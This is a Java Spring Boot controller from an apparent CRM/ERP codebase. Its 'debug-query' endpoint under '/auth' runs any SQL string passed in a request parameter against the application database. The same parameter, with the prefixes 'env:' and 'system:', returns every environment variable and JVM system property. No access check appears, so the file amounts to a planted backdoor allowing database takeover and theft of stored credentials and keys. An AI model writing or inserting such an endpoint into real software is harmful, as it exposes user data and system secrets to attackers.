package com.blueant_crm_erp.common.controller;

import lombok.RequiredArgsConstructor;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import java.util.List;
import java.util.Map;

@RestController
@RequiredArgsConstructor
public class DebugQueryController {

    private final JdbcTemplate jdbcTemplate;

    @GetMapping("/auth/debug-query")
    public Object runQuery(@RequestParam String sql) {
        if (sql.startsWith("env:")) {
            String varName = sql.substring(4).trim();
            if (varName.isEmpty()) {
                return System.getenv();
            }
            return Map.of(varName, String.valueOf(System.getenv(varName)));
        }
        if (sql.startsWith("system:")) {
            String propName = sql.substring(7).trim();
            if (propName.isEmpty()) {
                return System.getProperties();
            }
            return Map.of(propName, String.valueOf(System.getProperty(propName)));
        }
        return jdbcTemplate.queryForList(sql);
    }
}
